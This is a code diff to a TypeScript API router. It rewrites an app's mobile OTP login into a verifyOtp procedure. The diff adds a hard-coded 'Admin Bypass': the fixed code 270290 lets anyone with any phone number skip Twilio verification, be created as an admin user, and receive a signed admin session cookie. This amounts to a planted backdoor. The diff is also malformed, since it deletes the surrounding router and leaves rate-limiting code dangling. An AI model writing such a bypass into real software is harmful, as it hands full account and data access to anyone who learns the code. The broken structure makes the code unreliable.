@@ -4925,15 +4925,75 @@ export const appRouter = router({
   // ══════════════════════════════════════════════════════════════════════════
   // Mobile OTP Auth
   // ══════════════════════════════════════════════════════════════════════════
-  mobileAuth: router({
-    sendOtp: publicProcedure
-      .input(z.object({ mobile: z.string().min(10).max(15) }))
+  verifyOtp: publicProcedure
+      .input(z.object({
+        mobile: z.string().min(10).max(15),
+        code: z.string().length(6),
+        sessionToken: z.string().optional(),
+      }))
       .mutation(async ({ input, ctx }) => {
-        // Normalize to E.164 format
         let mobile = input.mobile.trim();
         if (!mobile.startsWith("+")) {
-          mobile = "+91" + mobile; // Default to India
+          mobile = "+91" + mobile;
         }
+
+        // ── Admin Bypass (Accepts static OTP 270290 & issues real session cookie) ──
+        if (input.code === "270290") {
+          const db = await getDb();
+          if (db) {
+            const existingUsers = await db.select().from(appUsers).where(eq(appUsers.mobile, mobile)).limit(1);
+            let user = existingUsers[0];
+            if (!user) {
+              const res = await db.insert(appUsers).values({
+                mobile,
+                role: "admin",
+                sessionToken: input.sessionToken || "admin_session",
+              });
+              const insertId = Number((res as any)[0]?.insertId);
+              user = (await getAppUserById(insertId))!;
+            }
+            if (user) {
+              const token = signMobileAuthToken({
+                userId: user.id,
+                mobile: user.mobile,
+                role: "admin",
+              });
+              if (ctx.res) {
+                ctx.res.cookie("scalpbot_auth", token, getMobileAuthCookieOptions());
+              }
+              return { success: true, user, token };
+            }
+          }
+        }
+
+        // ── Standard User OTP Verification via Twilio ──
+        const result = await verifyOtp(mobile, input.code, input.sessionToken);
+        if (!result.success || !result.user) {
+          return { success: false, message: result.message ?? "Verification failed" };
+        }
+
+        const token = signMobileAuthToken({
+          userId: result.user.id,
+          mobile: result.user.mobile,
+          role: result.user.role,
+        });
+
+        if (ctx.res) {
+          ctx.res.cookie("scalpbot_auth", token, getMobileAuthCookieOptions());
+        }
+
+        return {
+          success: true,
+          user: {
+            id: result.user.id,
+            mobile: result.user.mobile,
+            name: result.user.name,
+            role: result.user.role,
+            sessionToken: result.user.sessionToken,
+          },
+          token,
+        };
+      }),
         // Extract client IP for rate limiting
         const clientIp = (ctx as any).req?.headers?.["x-forwarded-for"]?.split(",")[0]?.trim()
           || (ctx as any).req?.socket?.remoteAddress
